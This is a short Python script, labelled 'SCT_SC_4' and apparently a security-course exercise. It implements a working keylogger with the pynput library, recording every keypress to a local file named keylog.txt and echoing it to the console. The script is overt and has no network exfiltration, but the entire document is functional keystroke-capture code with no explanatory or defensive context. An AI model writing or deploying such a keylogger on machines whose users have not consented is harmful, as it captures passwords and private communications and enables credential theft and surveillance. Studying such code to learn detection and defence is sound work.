# SCT_SC_4
from pynput.keyboard import Listener

LOG_FILE = "keylog.txt"

def log_key(key):
    try:
        key = key.char  # For normal keys
    except AttributeError:
        key = f"[{key}]"  # Format special keys properly

    with open(LOG_FILE, "a") as file:
        file.write(key + " ")

    print(key, end=" ", flush=True)

def main():
    print("[+] Keylogger Started. Press Ctrl+C to stop.")
    with Listener(on_press=log_key) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            print("\n[+] Keylogger Stopped.")

if __name__ == "__main__":
    main()
